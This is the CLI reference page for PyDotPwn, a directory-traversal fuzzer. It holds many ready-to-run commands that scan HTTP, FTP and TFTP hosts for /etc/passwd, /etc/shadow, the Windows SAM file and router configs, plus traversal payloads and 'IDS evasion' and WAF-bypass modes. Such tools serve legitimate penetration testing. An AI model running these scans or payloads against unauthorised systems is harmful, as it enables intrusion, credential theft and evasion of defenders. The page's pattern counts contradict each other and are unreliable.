---
layout: page
title: "CLI Reference"
permalink: /cli-reference/
---

# 💻 Complete CLI Reference

This is the comprehensive command-line interface reference for PyDotPwn. Every parameter, option, and feature is documented with examples and use cases.

## 📋 Table of Contents

- [Command Structure](#command-structure)
- [Enhanced Parameter Names](#enhanced-parameter-names)
- [Core Parameters](#core-parameters)
- [Module-Specific Parameters](#module-specific-parameters)
- [Advanced Options](#advanced-options)
- [Output and Reporting](#output-and-reporting)
- [Performance Tuning](#performance-tuning)
- [Examples by Use Case](#examples-by-use-case)

## � Revolutionary Path Validation Bypass

PyDotPwn includes the **industry's first comprehensive path validation bypass capability**, generating over **25,000 specialized patterns** designed to bypass modern application security controls.

### Quick Start Examples

```bash
# Generate all 25,000+ path validation bypass patterns
python dotdotpwn.py main --module stdout --os-type unix --file "/etc/passwd" --depth 3

# Test web application with path validation bypass
python dotdotpwn.py main --module http --host target.com --file /etc/passwd --depth 5

# Windows path validation bypass
python dotdotpwn.py main --module http --host windows.com --file "C:\Windows\System32\drivers\etc\hosts" --depth 4
```

### Pattern Coverage

| Pattern Type               | Count       | Example                                |
| -------------------------- | ----------- | -------------------------------------- |
| **Path Validation Bypass** | 25,000+     | `/var/www/uploads/../../../etc/passwd` |
| **Absolute Path Patterns** | 144+        | `/etc/passwd`, `%2fetc%2fpasswd`       |
| **Relative Traversal**     | 1,778+      | `../../../etc/passwd`                  |
| **Total Patterns**         | **25,000+** | **1,305% increase over original**      |

## 🏗️ Command Structure

PyDotPwn uses a modern CLI structure with multiple command modes:

### Main Scanning Commands

```bash
# Primary scanning interface with path validation bypass
python dotdotpwn.py main [OPTIONS]

# Legacy compatibility mode
python dotdotpwn.py [OPTIONS]

# Help and examples
python dotdotpwn.py help-examples
python dotdotpwn.py help-modules
```

The `generate` command is a powerful new feature that creates traversal patterns without performing actual scans. Perfect for testing, integration, and custom payloads.

### Generate Command Syntax

```bash
python dotdotpwn.py generate [OPTIONS]
```

### Generate Parameters

| Parameter            | Aliases                                                | Type    | Description                          | Default       |
| -------------------- | ------------------------------------------------------ | ------- | ------------------------------------ | ------------- |
| `--os-type`          | `-o`                                                   | choice  | Target OS (unix/windows/generic)     | `unix`        |
| `--file`             | `-f`, `--filename`, `--target-file`, `--specific-file` | string  | Target file to generate patterns for | `/etc/passwd` |
| `--depth`            | `-d`, `--max-depth`                                    | integer | Maximum traversal depth (1-50)       | `6`           |
| `--detection-method` | `-D`                                                   | choice  | Detection method for IDS evasion     | `any`         |
| `--absolute`         | `--include-absolute`                                   | flag    | Include absolute path patterns       | `False`       |
| `--no-absolute`      | `--exclude-absolute`                                   | flag    | Exclude absolute path patterns       | `True`        |
| `--output`           | `-o`, `--output-file`                                  | string  | Save patterns to file                | `stdout`      |
| `--quiet`            | `-q`                                                   | flag    | Suppress progress messages           | `False`       |

### Generate Examples

```bash
# Generate UNIX patterns for /etc/passwd with depth 5
python dotdotpwn.py generate --os-type unix --file /etc/passwd --depth 5

# Generate with stealth detection method (24 payloads)
python dotdotpwn.py generate --os-type unix --file /etc/passwd --detection-method simple

# Generate URL encoding bypass patterns (30 payloads)
python dotdotpwn.py generate --file /etc/passwd --detection-method url_encoding

# Generate Windows patterns with absolute paths
python dotdotpwn.py generate --os-type windows --file "c:\\windows\\system32\\config\\sam" --absolute

# Generate path validation bypass patterns (1.7M payloads)
python dotdotpwn.py generate --file /etc/shadow --detection-method path_validation

# Generate patterns and save to file
python dotdotpwn.py generate --file /etc/shadow --depth 3 --output patterns.txt --absolute

# Quiet mode for scripting
python dotdotpwn.py generate --file /etc/passwd --quiet --absolute > payloads.txt
```

## 🛡️ Detection Methods for IDS Evasion

The `--detection-method` (`-D`) parameter allows you to choose specific attack methods to avoid triggering intrusion detection systems:

| Method            | Payloads | Traffic Level    | Use Case                      | Example Pattern                       |
| ----------------- | -------- | ---------------- | ----------------------------- | ------------------------------------- |
| `simple`          | 24       | 🟢 Ultra Stealth | Basic recon, evade monitoring | `../../../etc/passwd`                 |
| `url_encoding`    | 30       | 🟢 Ultra Stealth | WAF bypass, filter evasion    | `%2e%2e%2f/etc/passwd`                |
| `non_recursive`   | 71       | 🟢 Stealth       | Non-recursive filter bypass   | `....//....//....//etc/passwd`        |
| `absolute_path`   | 23K      | 🟡 Moderate      | Direct path injection         | `/etc/passwd`                         |
| `null_byte`       | 75K      | 🟠 High Volume   | Extension validation bypass   | `../../../etc/passwd%00.png`          |
| `path_validation` | 1.7M     | 🔴 Very High     | Complex validation bypass     | `/var/www/images/../../../etc/passwd` |
| `any`             | 1.9M     | 🔴 IDS Trigger   | Comprehensive testing         | All methods combined                  |

### Detection Method Examples

```bash
# Ultra stealth HTTP scan (24 payloads)
python dotdotpwn.py main --module http --host target.com --detection-method simple

# URL encoding bypass for WAF evasion (30 payloads)
python dotdotpwn.py main --module http --host target.com --detection-method url_encoding

# Non-recursive filter bypass (71 payloads)
python dotdotpwn.py main --module ftp --host ftp.target.com --detection-method non_recursive

# Path validation bypass for enterprise apps (1.7M payloads)
python dotdotpwn.py main --module http --host enterprise.com --detection-method path_validation

# Traditional comprehensive scan (1.9M payloads - may trigger IDS)
python dotdotpwn.py main --module http --host target.com --detection-method any
```

## 🔢 Understanding the Depth Parameter

The **depth parameter** (`-d`, `--depth`, `--max-depth`) is one of the most critical settings in directory traversal testing. It controls how many directory levels the tool traverses upward to reach target files.

### 📊 How Depth Works

```bash
# Depth 1: Go up 1 directory level
../etc/passwd

# Depth 2: Go up 2 directory levels
../../etc/passwd

# Depth 3: Go up 3 directory levels
../../../etc/passwd

# Depth 5: Go up 5 directory levels
../../../../../etc/passwd
```

### 🏗️ Real-World Directory Structure Examples

#### Web Application Scenarios

```bash
# Scenario 1: Simple web app
/var/www/html/index.php
# To reach /etc/passwd, need depth 3:
# html -> www -> var -> / (root)
# Pattern: ../../../etc/passwd

# Scenario 2: WordPress installation
/var/www/html/wp-content/uploads/file.php
# To reach /etc/passwd, need depth 5:
# uploads -> wp-content -> html -> www -> var -> / (root)
# Pattern: ../../../../../etc/passwd

# Scenario 3: Deep enterprise application
/opt/company/apps/web/public/uploads/temp/file.php
# To reach /etc/passwd, need depth 7:
# temp -> uploads -> public -> web -> apps -> company -> opt -> / (root)
# Pattern: ../../../../../../etc/passwd
```

### 🎯 Choosing the Right Depth

| Application Type            | Recommended Depth | Reasoning                           |
| --------------------------- | ----------------- | ----------------------------------- |
| **Simple CGI/PHP**          | 1-3               | Usually in `/var/www/html/`         |
| **CMS (WordPress, Drupal)** | 3-6               | Complex directory structures        |
| **Java Web Apps**           | 4-8               | Often in `/opt/tomcat/webapps/app/` |
| **Enterprise Applications** | 6-12              | Deep nested directory structures    |
| **Docker/Container Apps**   | 2-5               | Simplified container paths          |
| **Windows IIS**             | 2-6               | Typically in `C:\inetpub\wwwroot\`  |

### ⚡ Performance vs Coverage Trade-offs

```bash
# Shallow depth (1-3): Fast but limited coverage
python dotdotpwn.py -m http -h example.com -f /etc/passwd -d 3
# Generates: ~890 patterns

# Medium depth (4-6): Balanced approach
python dotdotpwn.py -m http -h example.com -f /etc/passwd -d 6
# Generates: ~1,778 patterns

# Deep depth (7-10): Comprehensive but slower
python dotdotpwn.py -m http -h example.com -f /etc/passwd -d 10
# Generates: ~2,960+ patterns

# Very deep (10+): For complex enterprise environments
python dotdotpwn.py -m http -h example.com -f /etc/passwd -d 15
# Generates: 4,400+ patterns
```

### 🛠️ Advanced Depth Usage

#### Combined with Absolute Paths

```bash
# Generate both relative and absolute patterns
python dotdotpwn.py generate --depth 5 --absolute --file /etc/passwd
# Creates:
# - Relative: ../../../../../etc/passwd (depth 5)
# - Absolute: /etc/passwd, %2fetc%2fpasswd, \\etc\\passwd
```

#### Bisection Algorithm Integration

```bash
# Use depth with bisection for intelligent testing
python dotdotpwn.py -m http -h example.com -X -d 8
# Bisection algorithm uses depth 8 as maximum boundary
```

### 📈 Pattern Generation Formula

For each depth level, PyDotPwn generates multiple pattern variations:

```
Total Patterns = (Base Patterns × Depth Range × Encoding Variations) + Absolute Patterns

Where:
- Base Patterns: ~24 different traversal patterns (../, ..\\, %2e%2e%2f, etc.)
- Depth Range: 1 to specified depth (e.g., depth 6 = 6 levels)
- Encoding Variations: ~20 different URL encoding techniques
- Absolute Patterns: 144+ direct path injection patterns (if enabled)
```

### 🔍 Depth Best Practices

1. **Start with Medium Depth (4-6)**: Good balance of coverage and performance
2. **Increase Gradually**: If no results, try higher depths
3. **Monitor Performance**: Higher depths generate exponentially more requests
4. **Use with Absolute Paths**: Combine `--depth` with `--absolute` for maximum coverage
5. **Consider Target Architecture**: Research the target's likely directory structure

### 💡 Pro Tips

```bash
# Quick depth testing - try multiple depths
for depth in 3 5 8; do
  echo "Testing depth $depth"
  python dotdotpwn.py generate --depth $depth --file /etc/passwd --quiet | wc -l
done

# Save patterns by depth for analysis
python dotdotpwn.py generate --depth 5 --absolute --file /etc/passwd > depth5_patterns.txt
python dotdotpwn.py generate --depth 10 --absolute --file /etc/passwd > depth10_patterns.txt
```

## 🎯 Enhanced Parameter Names

One of the key improvements over the original Perl implementation is support for both traditional short parameters and memorable long parameter names.

### Core Parameters

| Short | Long Options                                               | Type    | Description                    | Example          |
| ----- | ---------------------------------------------------------- | ------- | ------------------------------ | ---------------- |
| `-m`  | `--module`                                                 | choice  | Fuzzing module selection       | `-m http`        |
| `-h`  | `--host`, `--hostname`                                     | string  | Target hostname or IP address  | `-h example.com` |
| `-f`  | `--file`, `--filename`, `--target-file`, `--specific-file` | string  | Target file to test for        | `-f /etc/passwd` |
| `-k`  | `--pattern`, `--keyword`, `--match-pattern`                | string  | Success detection pattern      | `-k "root:"`     |
| `-d`  | `--depth`, `--max-depth`                                   | integer | Maximum traversal depth (1-50) | `-d 10`          |
| `-x`  | `--port`                                                   | integer | Target port number             | `-x 8080`        |
|       | `--absolute`, `--include-absolute`                         | flag    | Include absolute path patterns | `--absolute`     |
|       | `--no-absolute`, `--exclude-absolute`                      | flag    | Exclude absolute path patterns | `--no-absolute`  |

### Detection & Intelligence

| Short | Long Options                           | Type   | Description                     | Example      |
| ----- | -------------------------------------- | ------ | ------------------------------- | ------------ |
| `-O`  | `--os-detection`, `--detect-os`        | flag   | Enable OS detection             | `-O`         |
| `-o`  | `--os-type`, `--operating-system`      | choice | Manual OS specification         | `-o windows` |
| `-s`  | `--service-detection`, `--banner-grab` | flag   | Service version detection       | `-s`         |
| `-E`  | `--extra-files`                        | flag   | Include additional common files | `-E`         |
| `-X`  | `--bisection`, `--binary-search`       | flag   | Use bisection algorithm         | `-X`         |

### Protocol & Security Options

| Short | Long Options                | Type   | Description               | Example               |
| ----- | --------------------------- | ------ | ------------------------- | --------------------- |
| `-S`  | `--ssl`, `--https`, `--tls` | flag   | Enable SSL/TLS encryption | `-S`                  |
| `-U`  | `--username`, `--user`      | string | Authentication username   | `-U admin`            |
| `-P`  | `--password`, `--pass`      | string | Authentication password   | `-P secret`           |
| `-M`  | `--method`, `--http-method` | choice | HTTP request method       | `-M POST`             |
| `-A`  | `--user-agent`              | string | Custom User-Agent header  | `-A "Mozilla/5.0..."` |

### Performance & Behavior

| Short | Long Options                                     | Type  | Description                      | Example  |
| ----- | ------------------------------------------------ | ----- | -------------------------------- | -------- |
| `-t`  | `--delay`, `--time-delay`                        | float | Delay between requests (seconds) | `-t 0.5` |
| `-b`  | `--break`, `--break-on-first`, `--stop-on-first` | flag  | Stop after first vulnerability   | `-b`     |
| `-C`  | `--continue`, `--continue-on-error`              | flag  | Continue on connection errors    | `-C`     |
| `-q`  | `--quiet`, `--silent`                            | flag  | Quiet mode (minimal output)      | `-q`     |

### Output & Reporting

| Short | Long Options                            | Type   | Description              | Example           |
| ----- | --------------------------------------- | ------ | ------------------------ | ----------------- |
| `-r`  | `--report`, `--report-file`, `--output` | string | Output report filename   | `-r results.json` |
| `-F`  | `--format`, `--report-format`           | choice | Report format            | `-F json`         |
| `-T`  | `--timestamp`                           | flag   | Add timestamp to reports | `-T`              |

## 🧩 Module-Specific Parameters

### HTTP Module (`--module http`)

The HTTP module is the most versatile, designed for testing web applications.

#### Basic HTTP Parameters

```bash
# Required
--module http
--host <hostname>
--pattern <success_pattern>

# Optional
--port <port>              # Default: 80 (443 if SSL)
--ssl                      # Enable HTTPS
--method <GET|POST|HEAD>   # HTTP method
--user-agent <string>      # Custom User-Agent
```

#### HTTP Examples

```bash
# Basic HTTP scan
python dotdotpwn.py --module http --host example.com --pattern "root:"

# HTTPS with custom port
python dotdotpwn.py --module http --host secure.example.com --port 8443 --ssl --pattern "Administrator"

# POST request with authentication
python dotdotpwn.py --module http --host internal.com --method POST --username admin --password secret --pattern "sensitive"

# Custom User-Agent for stealth
python dotdotpwn.py --module http --host target.com --user-agent "Mozilla/5.0 (compatible; SecurityScanner)" --pattern "root:"
```

### HTTP-URL Module (`--module http-url`)

Specialized for testing specific URL parameters with the TRAVERSAL placeholder.

#### HTTP-URL Parameters

```bash
# Required
--module http-url
--url <url_with_TRAVERSAL_placeholder>
--pattern <success_pattern>

# The URL must contain the word "TRAVERSAL" which will be replaced with directory traversal patterns
```

#### HTTP-URL Examples

```bash
# Basic URL parameter testing
python dotdotpwn.py --module http-url --url "http://example.com/page.php?file=TRAVERSAL" --pattern "root:"

# HTTPS with complex URL
python dotdotpwn.py --module http-url --url "https://app.com/api/v1/files/TRAVERSAL?format=raw" --pattern "<?php"

# POST data parameter testing
python dotdotpwn.py --module http-url --url "http://site.com/upload.php" --method POST --data "filename=TRAVERSAL&action=view" --pattern "sensitive"
```

### FTP Module (`--module ftp`)

Tests FTP servers for directory traversal vulnerabilities.

#### FTP Parameters

```bash
# Required
--module ftp
--host <hostname>

# Optional
--port <port>              # Default: 21
--username <username>      # Default: anonymous
--password <password>      # Default: dot@dot.pwn
--pattern <pattern>        # Success detection pattern
```

#### FTP Examples

```bash
# Anonymous FTP testing
python dotdotpwn.py --module ftp --host ftp.example.com --pattern "root:"

# Authenticated FTP testing
python dotdotpwn.py --module ftp --host 192.168.1.100 --username admin --password secret --pattern "Administrator"

# Custom port FTP
python dotdotpwn.py --module ftp --host ftp.company.com --port 2121 --pattern "sensitive"
```

### TFTP Module (`--module tftp`)

Tests TFTP (Trivial File Transfer Protocol) servers, common in network devices.

#### TFTP Parameters

```bash
# Required
--module tftp
--host <hostname>

# Optional
--port <port>              # Default: 69
--pattern <pattern>        # Success detection pattern
--file <target_file>       # Target file to retrieve
```

#### TFTP Examples

```bash
# Basic TFTP testing
python dotdotpwn.py --module tftp --host 192.168.1.1 --pattern "root:"

# Network device configuration testing
python dotdotpwn.py --module tftp --host router.company.com --file startup-config --pattern "enable secret"

# Windows TFTP testing
python dotdotpwn.py --module tftp --host windows-server.com --file boot.ini --pattern "Windows"
```

### Payload Module (`--module payload`)

For testing custom protocols or services with custom payloads.

#### Payload Parameters

```bash
# Required
--module payload
--host <hostname>
--port <port>
--payload-file <filename>

# Optional
--ssl                      # Enable SSL/TLS
--pattern <pattern>        # Success detection pattern
```

#### Payload Examples

```bash
# Custom protocol testing
python dotdotpwn.py --module payload --host service.com --port 9999 --payload-file custom_payloads.txt --pattern "access granted"

# SSL custom service
python dotdotpwn.py --module payload --host secure-service.com --port 443 --ssl --payload-file ssl_payloads.txt --pattern "directory:"
```

### STDOUT Module (`--module stdout`)

Generates directory traversal patterns and outputs them to stdout for use with other tools.

#### STDOUT Parameters

```bash
# Required
--module stdout

# Optional
--depth <depth>            # Pattern depth
--os-type <unix|windows|generic>
--file <target_file>       # Target file for patterns
--extension <ext>          # File extension to append
```

#### STDOUT Examples

```bash
# Generate Unix patterns
python dotdotpwn.py --module stdout --depth 8 --os-type unix --file /etc/passwd

# Generate Windows patterns with extension
python dotdotpwn.py --module stdout --depth 6 --os-type windows --file boot.ini --extension .bak

# Generate generic patterns
python dotdotpwn.py --module stdout --depth 10 --os-type generic --file config.txt | head -50
```

## 🔍 Advanced Options

### OS Detection (`--os-detection`, `-O`)

Automatically detects the target operating system using nmap and adjusts patterns accordingly.

```bash
# Enable OS detection
python dotdotpwn.py --module http --host example.com --os-detection --pattern "root:"

# Manual OS specification (if detection fails)
python dotdotpwn.py --module http --host example.com --os-type windows --pattern "Administrator"
```

**Supported OS Types:**

- `unix` - Linux, Unix, BSD systems
- `windows` - Windows systems
- `generic` - Universal patterns

### Service Detection (`--service-detection`, `-s`)

Performs banner grabbing and service version detection.

```bash
# Enable service detection
python dotdotpwn.py --module http --host example.com --service-detection --pattern "root:"

# Combines well with OS detection
python dotdotpwn.py --module http --host example.com --os-detection --service-detection --pattern "root:"
```

### Bisection Algorithm (`--bisection`, `-X`)

Uses binary search to find the exact depth where the vulnerability exists, minimizing the number of requests.

```bash
# Enable bisection algorithm
python dotdotpwn.py --module http --host example.com --bisection --pattern "root:"

# How it works:
# 1. Tests maximum depth first
# 2. If vulnerability found, searches for minimum working depth
# 3. Uses binary search to minimize test count
# 4. Provides exact vulnerability depth
```

### Extra Files (`--extra-files`, `-E`)

Includes additional common files based on the detected or specified OS type.

```bash
# Include extra common files
python dotdotpwn.py --module http --host example.com --extra-files --pattern "root:"

# Extra files included:
# Unix: /etc/shadow, /etc/group, /etc/hosts, /proc/version
# Windows: boot.ini, win.ini, system.ini, autoexec.bat
```

## 📊 Output and Reporting

### Report Formats

DotDotPwn supports multiple output formats for different use cases:

```bash
# Text format (default, human-readable)
python dotdotpwn.py --module http --host example.com --report results.txt --format text

# JSON format (machine-readable, structured)
python dotdotpwn.py --module http --host example.com --report results.json --format json

# CSV format (spreadsheet-compatible)
python dotdotpwn.py --module http --host example.com --report results.csv --format csv

# XML format (structured data exchange)
python dotdotpwn.py --module http --host example.com --report results.xml --format xml

# HTML format (web-friendly with styling)
python dotdotpwn.py --module http --host example.com --report report.html --format html
```

### Report Structure

#### JSON Report Example

```json
{
  "scan_info": {
    "target": "example.com",
    "module": "http",
    "timestamp": "2025-09-28T10:30:00Z",
    "duration": 23.4,
    "total_requests": 247
  },
  "vulnerabilities": [
    {
      "url": "http://example.com/page.php?file=../../../etc/passwd",
      "method": "GET",
      "depth": 3,
      "pattern_matched": "root:",
      "response_code": 200,
      "content_length": 1847
    }
  ],
  "statistics": {
    "vulnerabilities_found": 1,
    "total_patterns_tested": 247,
    "average_response_time": 0.312,
    "success_rate": 0.4
  }
}
```

### Output Control

```bash
# Quiet mode (minimal output)
python dotdotpwn.py --module http --host example.com --quiet --pattern "root:"

# Verbose mode (detailed output)
python dotdotpwn.py --module http --host example.com --verbose --pattern "root:"

# Timestamped reports
python dotdotpwn.py --module http --host example.com --timestamp --report results.json
```

## ⚡ Performance Tuning

### Request Timing

```bash
# Fast scanning (be careful not to overwhelm target)
python dotdotpwn.py --module http --host example.com --delay 0.1 --pattern "root:"

# Standard scanning (recommended)
python dotdotpwn.py --module http --host example.com --delay 0.3 --pattern "root:"

# Slow/stealth scanning
python dotdotpwn.py --module http --host example.com --delay 2.0 --pattern "root:"
```

### Depth Control

```bash
# Shallow scan (faster)
python dotdotpwn.py --module http --host example.com --depth 4 --pattern "root:"

# Standard depth
python dotdotpwn.py --module http --host example.com --depth 6 --pattern "root:"

# Deep scan (thorough but slower)
python dotdotpwn.py --module http --host example.com --depth 12 --pattern "root:"
```

### Optimization Flags

```bash
# Break on first vulnerability found
python dotdotpwn.py --module http --host example.com --break-on-first --pattern "root:"

# Continue on connection errors
python dotdotpwn.py --module http --host example.com --continue-on-error --pattern "root:"

# Combine for fastest scanning
python dotdotpwn.py --module http --host example.com --break-on-first --continue-on-error --quiet --delay 0.1 --pattern "root:"
```

## 🎯 Examples by Use Case

### Web Application Testing

```bash
# Basic web app scan
python dotdotpwn.py --module http --host webapp.com --pattern "<?php" --depth 8

# E-commerce site testing
python dotdotpwn.py --module http --host shop.com --pattern "mysql_connect" --extra-files --os-detection

# API endpoint testing
python dotdotpwn.py --module http --host api.service.com --port 8080 --method POST --pattern "database" --user-agent "API-Scanner/1.0"
```

### Infrastructure Assessment

```bash
# FTP server assessment
python dotdotpwn.py --module ftp --host ftp.company.com --pattern "confidential" --username test --password test

# Network device testing
python dotdotpwn.py --module tftp --host 192.168.1.1 --pattern "enable secret" --file startup-config

# Custom service testing
python dotdotpwn.py --module payload --host custom-service.com --port 9999 --payload-file custom.txt --pattern "access"
```

### Stealth and Evasion

```bash
# Low and slow scanning
python dotdotpwn.py --module http --host target.com --delay 3.0 --depth 6 --quiet --continue-on-error

# Custom User-Agent
python dotdotpwn.py --module http --host target.com --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --pattern "root:"

# Minimal footprint
python dotdotpwn.py --module http --host target.com --break-on-first --delay 1.0 --quiet --pattern "sensitive"
```

### Comprehensive Assessment

```bash
# Full-featured scan with all intelligence
python dotdotpwn.py --module http --host target.com --os-detection --service-detection --extra-files --bisection --report full_assessment.json --format json --timestamp

# Multi-format reporting
python dotdotpwn.py --module http --host target.com --pattern "root:" --report results.json --format json --continue-on-error
python dotdotpwn.py --module http --host target.com --pattern "root:" --report results.html --format html --continue-on-error
```

### Pattern Generation

```bash
# Generate patterns for external tools
python dotdotpwn.py --module stdout --depth 8 --os-type unix --file /etc/passwd > unix_patterns.txt

# Generate Windows patterns
python dotdotpwn.py --module stdout --depth 6 --os-type windows --file boot.ini --extension .bak > windows_patterns.txt

# Generate and pipe to other tools
python dotdotpwn.py --module stdout --depth 10 --file config.txt | head -100 | while read pattern; do echo "Testing: $pattern"; done
```

## 🔧 Environment Variables

Set these environment variables to customize default behavior:

```bash
# Default delay between requests
export DOTDOTPWN_DEFAULT_DELAY=0.5

# Default traversal depth
export DOTDOTPWN_DEFAULT_DEPTH=6

# Default report format
export DOTDOTPWN_DEFAULT_FORMAT=json

# Enable debug mode
export DOTDOTPWN_DEBUG=1

# SSL verification (for testing environments)
export PYTHONHTTPSVERIFY=0  # Use with caution
```

## 📝 Configuration File

Create `~/.dotdotpwn/config.yaml` for persistent settings:

```yaml
# Default scan settings
default_delay: 0.3
default_depth: 6
default_format: json
continue_on_error: true
quiet_mode: false

# Default patterns for different scenarios
patterns:
  unix: "root:"
  windows: "Administrator"
  web: "<?php"
  database: "mysql_connect"
  config: "[main]"

# HTTP settings
http:
  default_user_agent: "DotDotPwn/3.0.2"
  timeout: 30
  max_redirects: 5

# Reporting settings
reports:
  directory: "~/dotdotpwn-reports"
  auto_timestamp: true
  default_format: "json"

# Performance settings
performance:
  default_delay: 0.3
  max_concurrent: 10
  timeout: 30
```

---

This CLI reference covers all available options and parameters. For specific examples and real-world scenarios, check out the [Examples section](examples) or continue with the [GUI Guide](gui-guide) for the graphical interface documentation.
